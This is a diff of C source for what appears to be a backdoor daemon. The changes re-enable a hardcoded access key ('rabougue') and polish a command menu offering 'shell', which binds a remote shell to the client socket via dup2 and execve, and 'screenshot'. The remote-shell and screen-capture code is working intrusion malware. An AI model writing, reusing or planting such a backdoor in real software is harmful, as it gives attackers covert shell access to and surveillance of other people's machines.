@@ -103,7 +103,7 @@ void	spawn_shell(t_users *users, char **envp)
 	{
 		for(int i=0; i<3; i++)
 			dup2(users->sd, i);
-		send(users->sd, "Spawning shell\n> ", 15, 0);
+		send(users->sd, "\033[31mSpawning shell\033[0m\n> ", 24, 0);
 		if (execve(shell[0], shell, envp) == -1)
 			printf("error\n");
 	}
@@ -205,11 +205,11 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 			users.sd = connexion->client_socket[users.i];
 			if (users.key[users.i] == false)
 				send(users.sd, "KEY: ", 5, 0);
-			else
-				send(users.sd, "> ", 2, 0);
-
 			if (FD_ISSET(users.sd , &users.readfds))
 			{
+				if (users.key[users.i] == true)
+					send(users.sd, "> ", 2, 0);
+
 				if ((valrecv = recv(users.sd , buffer, BUFFSIZE, 0)) == 0)
 				{
 					close(users.sd);
@@ -222,7 +222,7 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 					buffer[valrecv -1] = '\0';
 					if (users.key[users.i] == false)
 					{
-						/*if (!strcmp(buffer, "rabougue"))*/ //Ne pas oublier de uncoment
+						if (!strcmp(buffer, "rabougue"))
 							users.key[users.i] = true;
 					}
 					else
@@ -236,13 +236,13 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 							users.nb_user--;
 						}
 						if (!strcmp(buffer, "?"))
-						{
 							send(users.sd, "\n'shell'\tSpawn remote shell on 4243\n'screenshot'	take screenshot\n> ", 66, 0);
-						}
 						else if (!strcmp(buffer, "screenshot"))
 							screenshot(&users, envp);
-						if (!strcmp(buffer, "shell"))
+						else if (!strcmp(buffer, "shell"))
 							spawn_shell(&users, envp);
+						else if (strlen(buffer))
+							send(users.sd, "\nCommand not found. Type ? for print all command\n> ", 51, 0);
 					}
 					memset(&buffer, 0, BUFFSIZE);
 				}
